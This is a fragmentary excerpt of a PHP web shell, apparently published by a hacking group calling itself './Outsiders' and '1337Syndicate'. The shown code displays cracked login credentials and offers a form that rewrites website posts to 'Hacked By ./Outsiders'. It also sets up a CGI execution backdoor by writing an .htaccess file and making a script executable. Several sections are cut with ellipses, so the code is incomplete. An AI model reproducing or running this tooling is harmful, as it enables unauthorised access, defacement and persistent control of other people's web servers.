...
<span class="style4">Official Member: <br>./Outsiders - XylaufyyId - All Member</span><br><br>
...
<font color="#FFF000"> Users Found : <font color = 'red'>root@./Outsiders:~$ . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .</font></font><br>
...
<font color = "red" face = "Verdana">©2022 - 1337Syndicate </font> 			
<?php
exit;
}
...
echo "<center>";
echo "<br>";
echo "<img src = 'https://a.top4top.io/p_2317jl8lf0.jpg' width = '110' height = '110' id='spinner'></img>";
echo "&emsp;&emsp;&emsp;";
...
echo "<p align='center' dir='ltr'><font face='Arial Black' size='2'>This Password Seems Working !Try It ^_^ by ./Outsiders|| Username: <font color='green'>$user</font>&nbsp; Password : <font color='green'>$pass</font></font></p>";
}
}            
...
<br>
<br>
<center><p><b><font size='2' face='Trebuchet MS' color='#FFFFFF'>Published by : ./Outsiders<br><font size='2' face='Trebuchet MS' color='#FFFFFF'>Coded by : ./Outsiders</font></b></p></center>";
}
...
echo"</textarea><br>ID: <input type='text' name='id' value='1'><br>TITLE :<input type='text' name='title' value='Hacked By ./Outsiders'><br>POST CONTENT: <input type='text' name='content' value='Hacked By ./Outsiders'><br>POSTNAME: <input type='text' name='postname' value='HackeD By ./Outsiders'><br>
...
if($_POST['edittitle']) {
	...
	$cgi_dir = mkdir('ia_cgi', 0755);
        chdir('ia_cgi');
	$file_cgi = "cgipy../Outsiders";
        $memeg = ".htaccess";
	$isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .Index_./Outsiders \n AddHandler cgi-script .Index_./Outsiders \n AddHandler cgi-script .Index_./Outsiders";
	...
	chmod($file_cgi, 0755);
        chmod($memeg, 0755);
	echo "<br><center>Done ... <a href='ia_cgi/cgipy../Outsiders' target='_blank'>Klik Here</a>";
}
